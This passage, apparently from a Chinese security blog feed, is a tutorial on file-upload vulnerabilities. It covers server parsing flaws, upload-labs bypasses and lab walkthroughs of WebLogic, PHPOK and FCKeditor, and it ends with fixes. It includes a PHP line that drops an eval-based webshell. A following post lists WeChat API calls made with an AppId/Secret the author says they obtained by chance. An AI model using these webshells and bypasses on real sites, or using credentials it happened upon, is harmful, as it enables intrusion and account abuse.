JUMPOUT(loc_5A63FD89);      ExtenMap = STRU::QueryStr(&amp;Url_FileExtenName);      JUMPOUT(_wcscmp(L&quot;.map&quot;, (const wchar_t *)ExtenMap), 0, loc_5A63FD7B);    }  }  if ( *((_DWORD *)pW3_URL_INFO + 201)    || (v10 = *((_DWORD *)pW3_URL_INFO + 202), v10 == 3)    || v10 == 2    || (v11 = *(_DWORD *)(*((_DWORD *)pW3_URL_INFO + 204) + 0xC4C),        v12 = STRU::QueryStr(url_FileName),        bSuccess = SelectMimeMappingForFileExt(v12, v11, (char *)pW3_URL_INFO + 756, (char *)pW3_URL_INFO + 1012),        bSuccess &gt;= 0) )    v8 = 0;  elseSubEnd:    v8 = bSuccess;  STRU::_STRU(&amp;Url_FileExtenName);  return v8;}</code></pre><p>以上有三处被标记的位置，这三处是用来检测点号、反斜杠、分号。、</p><p>可以理解为的检测流程为：</p><pre><code>www.xxx.com/xxx.asp;xxx.jpgN1:从头部查找查找&quot;.&quot;号,获得&quot;.asp;xxxx.jpg&quot;N2:查找&quot;;&quot;号,如果有则内存截断N3:查找&quot;/&quot;,如果有则内存截断</code></pre><p>因此，.asp将最终被保存下来，IIS6只简单地根据扩展名来识别，所以从脚本映射表中里查找脚本与扩展名对比，并利用asp.dll来解析。导致最终的问题产生。</p><p>对于此问题，微软并不认为这是一个漏洞，同样也没推出IIS6.0解析漏洞的补丁。因此在IIS6.0的网站下，此问题仍然可以尝试是否存在。</p><h3 id="0x05-2、Nginx-解析漏洞"><a href="#0x05-2、Nginx-解析漏洞" class="headerlink" title="0x05-2、Nginx 解析漏洞"></a>0x05-2、Nginx 解析漏洞</h3><p>​        Nginx是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点开发的。</p><p>​        在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。为什么是由于PHP-CGI的原因呢，因为在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。</p><p>​        普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问 ”<a href="http://www.xx.com/phpinfo.jpg/1.php”" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php”</a> 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p><p>​        在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p><p>然后访问xx.jpg/.php,在这个目录下就会生成一句话木马shell.php。同样利用phpstudy说明，上传1.jpg格式的文件，内容为访问phpinfo，如下即可触发：</p><p><img src="\2019\05\文件上传漏洞\1559013919103.png" alt="1559013919103"></p><h3 id="0x05-3、Apache-解析漏洞"><a href="#0x05-3、Apache-解析漏洞" class="headerlink" title="0x05-3、Apache 解析漏洞"></a>0x05-3、Apache 解析漏洞</h3><p>​        Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。</p><p>​        Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式：</p><pre><code>www.xxxx.com/apache.php.bbb.aaa</code></pre><p>Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。</p><p>​        那么为什么会产生此问题原因，在Apache的官方网站上，有一句这么关于“extension”的解释：</p><pre><code>地址：http://httpd.apache.org/docs/current/mod/directive-dict.htmlextensionIn general, this is the part of the filename which follows the last dot. However, Apache recognizes multiple filename extensions, so if a filename contains more than one dot, each dot-separated part of the filename following the first dot is an extension. For example, the filename file.html.en contains two extensions: .html and .en. For Apache directives, you may specify extensions with or without the leading dot. In addition, extensions are not case sensitive.</code></pre><p><img src="\2019\05\文件上传漏洞\1559021484728.png" alt="1559021484728"></p><p>​        通过这个解释可以看出来，Apache允许文件有多个后缀名，并会按照第一个点来分析文件后缀，例如file.html.en。Apache按照每个点来分割后缀名，因此此文件名为.html、.en。由于en后缀不被识别，便继续向前解析。</p><p>​        另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types中查找是否出现。</p><p>​        此处使用phpstudy测试，利用dvwa的文件上传功能，上传1.php.wwe。结果解析如下：</p><p><img src="\2019\05\文件上传漏洞\1559032463726.png" alt="1559032463726"></p><h2 id="0x06、测试方法"><a href="#0x06、测试方法" class="headerlink" title="0x06、测试方法"></a>0x06、测试方法</h2><p>对于文件上传漏洞方式和举例此处采用一个文件靶场，地址：<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><p>以下将利用靶场其中的一部分内容来举例说明文件上传漏洞的产生和效果。</p><p>环境：Ubuntu 18、Windows phpStudy (采用不一样的系统，为了在不同系统的差异做演示)</p><p>WEB容器：Apache 2.0</p><p>语言：PHP</p><p>抓包工具：Burp Suite Pro</p><p>验证工具：Hackbar插件</p><h3 id="0x06-1、前端验证"><a href="#0x06-1、前端验证" class="headerlink" title="0x06-1、前端验证"></a>0x06-1、前端验证</h3><p>此种验证形式在很多网站、CMS都有使用，只在前端利用JS来做效验，采用禁用JS上传、抓包上传都可以绕过此处限制。此处采用抓包演示。</p><p><img src="\2019\05\文件上传漏洞\1559032778870.png" alt="1559032778870"></p><p>点击上传文件，选择已经改成“.jpg”后缀的后门文件。修改burp中的文件后缀信息。</p><p><img src="\2019\05\文件上传漏洞\1559032949667.png" alt="1559032949667"></p><p>访问已经上传的文件，利用Hackbar访问phpinfo()。可以看到后门已经得到执行。</p><p><img src="\2019\05\文件上传漏洞\1559033444502.png" alt="1559033444502"></p><h3 id="0x06-2、-htaccess规则文件绕过"><a href="#0x06-2、-htaccess规则文件绕过" class="headerlink" title="0x06-2、.htaccess规则文件绕过"></a>0x06-2、.htaccess规则文件绕过</h3><p>​        在利用.htaccess文件之前，我们先来了解一下什么是.htaccess规则文件。.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p><p>​        概述来说，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>​        在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。</p><p>​        先上传一个.htaccess文件，内容为：<code>AddType application/x-httpd-php .aaa</code>。如下：</p><p><img src="\2019\05\文件上传漏洞\1559034387907.png" alt="1559034387907"></p><p>​        然后再上传文件后缀为.aaa的文件，让其解析为php类型文件。</p><p><img src="\2019\05\文件上传漏洞\1559034547623.png" alt="1559034547623"></p><p>​        上传成功后访问此上传文件，访问如下：</p><p><img src="\2019\05\文件上传漏洞\1559034597893.png" alt="1559034597893"></p><h3 id="0x06-3、文件名后缀大小写混合绕过"><a href="#0x06-3、文件名后缀大小写混合绕过" class="headerlink" title="0x06-3、文件名后缀大小写混合绕过"></a>0x06-3、文件名后缀大小写混合绕过</h3><p>​        在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。如下形式：</p><p><img src="\2019\05\文件上传漏洞\1559035809669.png" alt="1559035809669"></p><p>​        访问上传成功的文件：</p><p><img src="\2019\05\文件上传漏洞\1559035839659.png" alt="1559035839659"></p><h3 id="0x06-4、Windows文件流特性绕过"><a href="#0x06-4、Windows文件流特性绕过" class="headerlink" title="0x06-4、Windows文件流特性绕过"></a>0x06-4、Windows文件流特性绕过</h3><p>​        在讨论这种特性之前，我们先来认识一下Windows文件流。流文件，即NTFS交换数据流（alternate data streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，它使用资源派生来维持与文件相关的信息。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。</p><p>​        详细相关介绍和内容可以查看文章：<a href="https://www.freebuf.com/column/143101.html。此处不做深入解释。" target="_blank" rel="noopener">https://www.freebuf.com/column/143101.html。此处不做深入解释。</a></p><p>上传文件为xxx.php::$DATA类型的文件。可以看到上传的文件为xxx.php::$data。</p><p><img src="\2019\05\文件上传漏洞\1559092873963.png" alt="1559092873963"></p><p>我们访问的时候就可以直接访问xxx.php文件。</p><p><img src="\2019\05\文件上传漏洞\1559093029478.png" alt="1559093029478"></p><h3 id="0x06-5、-00截断绕过"><a href="#0x06-5、-00截断绕过" class="headerlink" title="0x06-5、%00截断绕过"></a>0x06-5、%00截断绕过</h3><p>​        以上问题被绕过的根本原因是采用了一些有缺陷的黑名单限制，一般采用白名单的限制会减少相当多的绕过问题产生，但是并不意味着一定安全，在某些没有处理严格的程序上，仍然可以采用截断绕过的形式。</p><p>首先我们来看这段上传的代码：</p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传失败&quot;;        }    } else {        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}</code></pre><p>可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。</p><p><img src="\2019\05\文件上传漏洞\1559095054720.png" alt="1559095054720"></p><p>访问上传地址路径：</p><p><img src="\2019\05\文件上传漏洞\1559095173000.png" alt="1559095173000"></p><h3 id="0x06-5、文件头检测绕过"><a href="#0x06-5、文件头检测绕过" class="headerlink" title="0x06-5、文件头检测绕过"></a>0x06-5、文件头检测绕过</h3><p>​        提到文件头检测，我们就先来认识一下常见文件的文件头格式。我们先打开一个正常的JPG图片格式文件，查看文件的文件头十六进制。采用010Editor。</p><p><img src="\2019\05\文件上传漏洞\1559096273090.png" alt="1559096273090"></p><p>​        右边栏中有明显的JFIF存储格式字样，文件头前十个字节为<code>FF D8 FF E0 00 10 4A 46 49 46</code>，其中开头标红的为标记码，FF D8代表SOI标记，意思是图像文件开始值。<code>4A 46 49 46</code>代表字符串JFIF标记。</p><p>关于JPEG文件格式介绍可以阅读：<a href="https://www.cnblogs.com/sddai/p/5666924.html" target="_blank" rel="noopener">https://www.cnblogs.com/sddai/p/5666924.html</a></p><p>​        然后我们再打开一份PNG文件格式的图片，同样采用010Editor来查看其十六进制。</p><p><img src="\2019\05\文件上传漏洞\1559097926431.png" alt="1559097926431"></p><p>​        对于的开头4字节为右栏中<code>‰PNG</code>字样，PNG的8字节文件署名域用来识别该文件是不是PNG文件。也就是<code>89 50 4E 47 0D 0A 1A 0A</code>。</p><p>关于PNG文件格式可以阅读：<a href="https://blog.csdn.net/qq_21950929/article/details/79198814" target="_blank" rel="noopener">https://blog.csdn.net/qq_21950929/article/details/79198814</a></p><p>​        同样打开一份GIF文件格式图片，用010Editor来打开查看文件。</p><p><img src="\2019\05\文件上传漏洞\1559098368605.png" alt="1559098368605"></p><p>​        文件十六进制中可以看到，其中<code>47 49 46 38 39 61</code>，代表了右栏中的GIF89a，这六个字节作为了GIF文件格式头的开头文件。而在其后的绕过中就采用了GIF89a这个字符串。</p><p>关于GIF文件格式可以阅读：<a href="https://www.jianshu.com/p/df52f1511cf8" target="_blank" rel="noopener">https://www.jianshu.com/p/df52f1511cf8</a></p><p>了解过文件格式后，我们来看这个文件格式检测绕过形式，首先查看代码，为了方便演示修改了源代码对文件格式的获取，此处只读取文件的前两个字节值：</p><pre><code>function getReailFileType($filename){    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType = &#39;&#39;;        switch($typeCode){              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        }            return $fileType;}$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;])){    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_type = getReailFileType($temp_file);    if($file_type == &#39;unknown&#39;){        $msg = &quot;文件未知，上传失败！&quot;;    }else{        $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);  //此处为了方便演示添加了file_ext 变量        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传出错！&quot;;        }    }}</code></pre><p>然后上传php文件，修改文件内容，添加文件头GIF89a：</p><p><img src="\2019\05\文件上传漏洞\1559098775049.png" alt="1559098775049"></p><p>这种添加形式类似于在hex中修改添加：</p><p><img src="\2019\05\文件上传漏洞\1559098877198.png" alt="1559098877198"></p><p>然后在访问以上传的文件：</p><p><img src="\2019\05\文件上传漏洞\1559098969088.png" alt="1559098969088"></p><h2 id="0x07、利用工具进行FUZZ"><a href="#0x07、利用工具进行FUZZ" class="headerlink" title="0x07、利用工具进行FUZZ"></a>0x07、利用工具进行FUZZ</h2><p>​        很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。</p><p>​        我们采用一个工具：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a> 来生成fuzz的字典。执行命令:</p><pre><code>python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt</code></pre><p>​        把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。</p><p><img src="\2019\05\文件上传漏洞\1559100590314.png" alt="1559100590314"></p><p>访问如图中的地址文件，可以看到上传成功：</p><p><img src="\2019\05\文件上传漏洞\1559100614602.png" alt="1559100614602"></p><h2 id="0x08、实战演示"><a href="#0x08、实战演示" class="headerlink" title="0x08、实战演示"></a>0x08、实战演示</h2><p>演示漏洞为：CVE-2018-2894</p><p>漏洞环境：Linux  Weblogic 12.2</p><p>漏洞下载地址：<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894</a></p><p>漏洞介绍：WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do。</p><p>影响范围为：Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。</p><p>下载好vulhub后，进入相应的CVE目录，执行如下命令：</p><pre><code>docker-compose up -d</code></pre><p>等到docker构建结束，会在7001端口开放一个服务，如下所示：</p><p><img src="\2019\05\文件上传漏洞\1559179291741.png" alt="1559179291741"></p><p>此处需要登陆账号和密码，正常情况下是尝试弱口令进后台上传文件，此处方便演示，从构建日志中查看密码：</p><pre><code>docker-compose logs | grep password查看结果：weblogic_1  |       ----&gt; &#39;weblogic&#39; admin password: oZUcqr8jweblogic_1  | admin password  : [oZUcqr8j]weblogic_1  | *  password assigned to an admin-level user.  For *</code></pre><p>登陆后界面如下：</p><p><img src="\2019\05\文件上传漏洞\1559179424802.png" alt="1559179424802"></p><p>点击左侧中的base_domain选项，再点击下面的高级选项，从高级中启用web测试页，保存。</p><p><img src="\2019\05\文件上传漏洞\1559179572139.png" alt="1559179572139"></p><p>然后访问<a href="http://192.168.120.132:7001/ws_utc/config.do页面，设置Work" target="_blank" rel="noopener">http://192.168.120.132:7001/ws_utc/config.do页面，设置Work</a> Home Dir，可以看到其中已经填写一个目录，此目录访问需要登陆，修改为P牛的建议路径：</p><pre><code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></pre><p>原路径为：</p><pre><code>/u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir</code></pre><p>在当前页面中选择安全-&gt;增加，上传webshell</p><p><img src="\2019\05\文件上传漏洞\1559180137203.png" alt="1559180137203"></p><p>然后从放回页面中查看id项时间戳，访问路径/ws_utc/css/config/keystore/时间戳_文件名</p><p><img src="\2019\05\文件上传漏洞\1559181960512.png" alt="1559181960512"></p><p>然后执行命令whoami:</p><p><img src="\2019\05\文件上传漏洞\1559182008589.png" alt="1559182008589"></p><h2 id="0x09、CMS实战演示"><a href="#0x09、CMS实战演示" class="headerlink" title="0x09、CMS实战演示"></a>0x09、CMS实战演示</h2><h3 id="0x09-1、PHPOK-任意文件上传"><a href="#0x09-1、PHPOK-任意文件上传" class="headerlink" title="0x09-1、PHPOK 任意文件上传"></a>0x09-1、PHPOK 任意文件上传</h3><p>演示漏洞为：phpok 任意文件上传</p><p>漏洞环境：Windows phpStudy</p><p>漏洞环境下载：<a href="https://download.phpok.com/4.8.338.zip" target="_blank" rel="noopener">https://download.phpok.com/4.8.338.zip</a></p><p>漏洞介绍：phpok 4.8.338版本管理后台存在任意文件上传漏洞，攻击者可利用漏洞上传任意文件，获取网站权限。</p><p>下载文件后，把解压的文件放入phpstudy中的www目录中，此处修改了版本号目录为phpok。然后访问本地地址：<a href="http://localhost/phpok，会自动进入安装页面，填写数据库密码，创建账号后自动进入安装页面，安装完成后显示如下：" target="_blank" rel="noopener">http://localhost/phpok，会自动进入安装页面，填写数据库密码，创建账号后自动进入安装页面，安装完成后显示如下：</a></p><p><img src="\2019\05\文件上传漏洞\1559121744850.png" alt="1559121744850"></p><p>使用一开始创建的账号密码登陆，登陆成功后在后侧的选择栏处选择工具-&gt;附件分类管理。</p><p><img src="\2019\05\文件上传漏洞\1559121904072.png" alt="1559121904072"></p><p>点击右侧上方的创建资源分类，然后在支持的附件类型中创建php文件类型。</p><p><img src="\2019\05\文件上传漏洞\1559122085369.png" alt="1559122085369"></p><p>选择左侧的内容管理-&gt;资讯中心-&gt;行业管理</p><p><img src="\2019\05\文件上传漏洞\1559122227998.png" alt="1559122227998"></p><p>点击页面中的选择图片-&gt;上传附近选择添加的附件类型-&gt;选择php文件上传，上传成功后点击上传的图片，选择预览就可以看到文件目录的地址</p><p><img src="\2019\05\文件上传漏洞\1559122408208.png" alt="1559122408208"></p><p>访问地址文件后门，可以看到执行代码成功</p><p><img src="\2019\05\文件上传漏洞\1559122505957.png" alt="1559122505957"></p><p>漏洞修复：此问题在高版本修复，及时升级到高版本处理，目前最新版本为5.2.116。</p><h3 id="0x09-2、FCKeditor-2-4-3-文件上传"><a href="#0x09-2、FCKeditor-2-4-3-文件上传" class="headerlink" title="0x09-2、FCKeditor 2.4.3 文件上传"></a>0x09-2、FCKeditor 2.4.3 文件上传</h3><p>演示漏洞为：FCKeditor 2.4.3 文件上传</p><p>漏洞环境：Windows phpStudy</p><p>漏洞环境下载：<a href="https://github.com/treadmillian/fckeditor.git" target="_blank" rel="noopener">https://github.com/treadmillian/fckeditor.git</a></p><p>漏洞介绍：FCKeditor  /fckeditor/editor/filemanager/upload/php/upload.php 文件上传漏洞。</p><p>首先从GitHub下载文件，放到phpStudy的www目录中，同时修改config.php文件，修改UserFilesPath参数为fck目录下的地址，修改如下：</p><pre><code>文件地址： \fckeditor\editor\filemanager\browser\default\connectors\php\config.php</code></pre><p><img src="\2019\05\文件上传漏洞\1559186974078.png" alt="1559186974078"></p><p>访问地址：<code>http://localhost/fckeditor/editor/filemanager/browser/default/connectors/test.html#</code></p><p><img src="\2019\05\文件上传漏洞\1559187113513.png" alt="1559187113513"></p><p>选择文件上传，由于2.4.3在文件配置已经进行了后缀的限制，默认限制为：</p><pre><code>array(&#39;html&#39;,&#39;htm&#39;,&#39;php&#39;,&#39;php2&#39;,&#39;php3&#39;,&#39;php4&#39;,&#39;php5&#39;,&#39;phtml&#39;,&#39;pwml&#39;,&#39;inc&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;ascx&#39;,&#39;jsp&#39;,&#39;cfm&#39;,&#39;cfc&#39;,&#39;pl&#39;,&#39;bat&#39;,&#39;exe&#39;,&#39;com&#39;,&#39;dll&#39;,&#39;vbs&#39;,&#39;js&#39;,&#39;reg&#39;,&#39;cgi&#39;,&#39;htaccess&#39;,&#39;asis&#39;,&#39;sh&#39;,&#39;shtml&#39;,&#39;shtm&#39;,&#39;phtm&#39;) </code></pre><p>对于此处漏洞我们采用空格绕过，先上传一个JPG的图片，抓包修改后缀，添加空格如下：</p><p><img src="\2019\05\文件上传漏洞\1559195350373.png" alt="1559195350373"></p><p>访问上传产生的路径文件，路径会显示在页面中：</p><pre><code>http://localhost/fckeditor/editor/filemanager/browser/default/connectors/uploads/file/05091707156.php</code></pre><p><img src="\2019\05\文件上传漏洞\1559195487979.png" alt="1559195487979"></p><p>执行一句话木马文件：</p><p><img src="\2019\05\文件上传漏洞\1559195403133.png" alt="1559195403133"></p><p>漏洞修复：由于此处使用黑名单校验，可以根据需要的类型修改为白名单参数。</p><h2 id="0x10、漏洞修复"><a href="#0x10、漏洞修复" class="headerlink" title="0x10、漏洞修复"></a>0x10、漏洞修复</h2><p>关于文件上传漏洞的产生和修改此处讨论两种文件上传漏洞的情况和修复：</p><p>1、代码未判断文件类型或者文件类型限制不完全，一般这种是黑名单或者没有限制，建议添加白名单限制参数数组，固定为图片或文本格式文件。例如如下：</p><pre><code>if(isset($_POST[&#39;submit&#39;])){    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = &quot;上传失败&quot;;        }    } else {        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    }}</code></pre><p>2、如果是使用WEB中间件存在上传，或者是CMS存在文件上传漏洞，根据官方建议安装补丁升级版本，或者使用官方推荐的临时修改策略来限制问题的产生和利用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01、漏洞简介&quot;&gt;&lt;a href=&quot;#0x01、漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01、漏洞简介&quot;&gt;&lt;/a&gt;0x01、漏洞简介&lt;/h2&gt;&lt;p&gt;​       文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>微信公众号接口</title>
    <link href="/2019/05/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A5%E5%8F%A3/"/>
    <id>/2019/05/微信公众号接口/</id>
    <published>2019-05-27T03:32:58.000Z</published>
    <updated>2019-05-27T03:33:38.075Z</updated>
    
    <content type="html"><![CDATA[<p>在一个偶然的机会获取到了一对微信AppId与Secret，于是整理了一下常用和有用的微信公众号信息获取的接口，以下是部分微信接口调用示例和说明。</p><h3 id="1、平台开发者获取access-token"><a href="#1、平台开发者获取access-token" class="headerlink" title="1、平台开发者获取access_token"></a>1、平台开发者获取access_token</h3><p>access_token是公众号的全局唯一接口调用凭据，公众号调用各接口时都需使用access_token。access_token的有效期目前为2个小时，需定时刷新，重复获取将导致上次获取的access_token失效。</p><h4 id="a、接口调用请求说明"><a href="#a、接口调用请求说明" class="headerlink" title="a、接口调用请求说明"></a>a、接口调用请求说明</h4><pre><code>http请求方式: GEThttps://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=APPID&amp;secret=APPSECRET</code></pre><h4 id="b、参数说明"><a href="#b、参数说明" class="headerlink" title="b、参数说明"></a>b、参数说明</h4><pre><code>参数               是否必须                说明grant_type           是        获取access_token填写client_credentialappid               是        第三方用户唯一凭证secret               是        第三方用户唯一凭证密钥，即appsecret</code></pre><h4 id="c、返回说明"><a href="#c、返回说明" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>微信会返回下述JSON数据包给公众号：{&quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;,&quot;expires_in&quot;:7200}</code></pre><h3 id="2、获取微信服务器IP地址"><a href="#2、获取微信服务器IP地址" class="headerlink" title="2、获取微信服务器IP地址"></a>2、获取微信服务器IP地址</h3><p>如果公众号基于安全等考虑，需要获知微信服务器的IP地址列表，以便进行相关限制，可以通过该接口获得微信服务器IP地址列表或者IP网段信息。</p><h4 id="a、接口调用请求说明-1"><a href="#a、接口调用请求说明-1" class="headerlink" title="a、接口调用请求说明"></a>a、接口调用请求说明</h4><pre><code>http请求方式: GEThttps://api.weixin.qq.com/cgi-bin/getcallbackip?access_token=ACCESS_TOKEN</code></pre><h4 id="b、参数说明-1"><a href="#b、参数说明-1" class="headerlink" title="b、参数说明"></a>b、参数说明</h4><pre><code>参数                 是否必须            说明access_token          是            公众号的access_token</code></pre><h4 id="c、返回说明-1"><a href="#c、返回说明-1" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>正常情况下，微信会返回下述JSON数据包给公众号：{    &quot;ip_list&quot;: [        &quot;127.0.0.1&quot;,         &quot;127.0.0.2&quot;,         &quot;101.226.103.0/25&quot;    ]}</code></pre><h3 id="3、自定义菜单查询接口"><a href="#3、自定义菜单查询接口" class="headerlink" title="3、自定义菜单查询接口"></a>3、自定义菜单查询接口</h3><p>使用接口创建自定义菜单后，开发者还可使用接口查询自定义菜单的结构。另外请注意，在设置了个性化菜单后，使用本自定义菜单查询接口可以获取默认菜单和全部个性化菜单信息。</p><h4 id="a、请求说明"><a href="#a、请求说明" class="headerlink" title="a、请求说明"></a>a、请求说明</h4><pre><code>http请求方式：GEThttps://api.weixin.qq.com/cgi-bin/menu/get?access_token=ACCESS_TOKEN</code></pre><h4 id="b、参数说明-2"><a href="#b、参数说明-2" class="headerlink" title="b、参数说明"></a>b、参数说明</h4><pre><code>参数                 是否必须            说明access_token          是            公众号的access_token</code></pre><h4 id="c、返回说明-2"><a href="#c、返回说明-2" class="headerlink" title="c、返回说明"></a>c、返回说明</h4><pre><code>对应创建接口，正确的Json返回结果:{    &quot;menu&quot;: {        &quot;button&quot;: [            {                &quot;type&quot;: &quot;click&quot;,                 &quot;name&quot;: &quot;今日歌曲&quot;,                 &quot;key&quot;: &quot;V1001_TODAY_MUSIC&quot;,                 &quot;sub_button&quot;: [ ]            },             {                &quot;name&quot;: &quot;菜单&quot;,                 &quot;sub_button&quot;: [                    {                        &quot;type&quot;: &quot;view&quot;,                         &quot;name&quot;: &quot;搜索&quot;,                         &quot;url&quot;: &quot;http://www.soso.com/&quot;,                         &quot;sub_button&quot;: [ ]                    }                ]            }        ]    }}</code></pre><h3 id="4、自定义菜单删除接口"><a href="#4、自定义菜单删除接口" class="headerlink" title="4、自定义菜单删除接口"></a>4、自定义菜单删除接口</h3><p>使用接口创建自定义菜单后，开发者还可使用接口删除当前使用的自定义菜单。另请注意，在个性化菜单时，调用此接口会删除默认菜单及全部个性化菜单。</p><h4 id="a、请求说明-1"><a href="#a、请求说明-1" class="headerlink" title="a、请求说明"></a>a、请求说明</h4><pre><code>http请求方式：GEThttps://api.weixin.qq.com/cgi-bin/menu/delete?access_token=ACCESS_TOKEN</code></pre><h4 id="b、参数说明-3"><a href="#b、参数说明-3" class="headerlink" title="b、参数说明"></a>b、参数说明</h4><pre><code>参数                 是否必须            说明access_token          是            公众号的access_token</code></pre><h4 id="c、返回说明-3"><a href="#c、返回说明-3" class="headerlink" 